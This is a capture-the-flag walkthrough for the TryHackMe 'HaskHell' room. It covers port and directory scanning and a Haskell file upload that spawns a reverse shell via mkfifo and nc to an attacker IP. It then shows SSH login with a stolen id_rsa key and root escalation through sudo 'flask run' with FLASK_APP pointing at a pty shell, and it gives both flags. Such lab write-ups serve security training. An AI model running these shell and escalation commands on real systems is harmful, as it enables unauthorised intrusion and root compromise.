# HaskHell

Teach your CS professor that his PhD isn't in security.

[HaskHell](https://tryhackme.com/room/haskhell)

## Topic's

- Network Enumeration
- Web Enumeration
- Misconfigured Binaries
- Exploiting PATH Variable
- Exploiting Python Flesk

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 HaskHell

Show your professor that his PhD isn't in security.

Please send comments/concerns/hatemail to @passthehashbrwn on Twitter.

```
kali@kali:~/CTFs/tryhackme/HaskHell$ sudo nmap -A -sS -sC -sV -O 10.10.34.202
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 11:03 CEST
Nmap scan report for 10.10.34.202
Host is up (0.040s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/15%OT=22%CT=1%CU=37988%PV=Y%DS=2%DC=T%G=Y%TM=5F8810
OS:6E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   33.32 ms 10.8.0.1
2   33.48 ms 10.10.34.202

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.84 seconds
```

```
kali@kali:~/CTFs/tryhackme/HaskHell$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.34.202:5001 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4658

Error Log: /opt/dirsearch/logs/errors-20-10-15_11-07-39.log

Target: http://10.10.34.202:5001

Output File: /opt/dirsearch/reports/10.10.34.202/_20-10-15_11-07-39.txt

[11:07:39] Starting:
[11:07:56] 200 -  237B  - /submit

Task Completed
```

[http://10.10.34.202:5001/submit](http://10.10.34.202:5001/submit)

```hs
#!/usr/bin/env runhaskhell
module Main where
import System.Process
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f"
```

```
kali@kali:~/CTFs/tryhackme/HaskHell$ wget http://10.10.34.202:8000/id_rsa
--2020-10-15 11:16:23--  http://10.10.34.202:8000/id_rsa
Connecting to 10.10.34.202:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1679 (1.6K) [application/octet-stream]
Saving to: ‘id_rsa’

id_rsa                  100%[==============================>]   1.64K  --.-KB/s    in 0s

2020-10-15 11:16:23 (5.03 MB/s) - ‘id_rsa’ saved [1679/1679]

kali@kali:~/CTFs/tryhackme/HaskHell$ chmod 600 id_rsa
kali@kali:~/CTFs/tryhackme/HaskHell$ ssh -i id_rsa prof@10.10.34.202
The authenticity of host '10.10.34.202 (10.10.34.202)' can't be established.
ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.34.202' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct 15 09:17:04 UTC 2020

  System load:  0.0                Processes:           99
  Usage of /:   26.2% of 19.56GB   Users logged in:     0
  Memory usage: 24%                IP address for eth0: 10.10.34.202
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Wed May 27 18:45:06 2020 from 192.168.126.128
$ id
uid=1002(prof) gid=1002(prof) groups=1002(prof)
$ ls
__pycache__  user.txt
$ cat user.txt
flag{academic_dishonesty}
```

```
prof@haskhell:~$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
prof@haskhell:~$ ls -l /usr/bin/flask
-rwxr-xr-x 1 root root 375 Jan 15  2018 /usr/bin/flask
prof@haskhell:~$ file /usr/bin/flask
/usr/bin/flask: Python script, ASCII text executable
prof@haskhell:~$ cat /usr/bin/flask
#!/usr/bin/python3
# EASY-INSTALL-ENTRY-SCRIPT: 'Flask==0.12.2','console_scripts','flask'
__requires__ = 'Flask==0.12.2'
import re
import sys
from pkg_resources import load_entry_point

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(
        load_entry_point('Flask==0.12.2', 'console_scripts', 'flask')()
    )
prof@haskhell:~$ python3 /usr/bin/flask
Usage: flask [OPTIONS] COMMAND [ARGS]...

  This shell command acts as general utility script for Flask applications.

  It loads the application configured (through the FLASK_APP environment
  variable) and then provides commands either provided by the application or
  Flask itself.

  The most useful commands are the "run" and "shell" command.

  Example usage:

    $ export FLASK_APP=hello.py
    $ export FLASK_DEBUG=1
    $ flask run

Options:
  --version  Show the flask version
  --help     Show this message and exit.

Commands:
  run    Runs a development server.
  shell  Runs a shell in the app context.
prof@haskhell:~$ cat > shell.py << EOF
> #!/usr/bin/env python3
> import pty
> pty.spawn("/bin/bash")
> EOF
prof@haskhell:~$ export FLASK_APP=shell.py
prof@haskhell:~$ sudo /usr/bin/flask run
root@haskhell:~# cat /root/root.txt
flag{im_purely_functional}
```

1. Get the flag in the user.txt file.

`flag{academic_dishonesty}`

2. Obtain the flag in root.txt

`flag{im_purely_functional}`
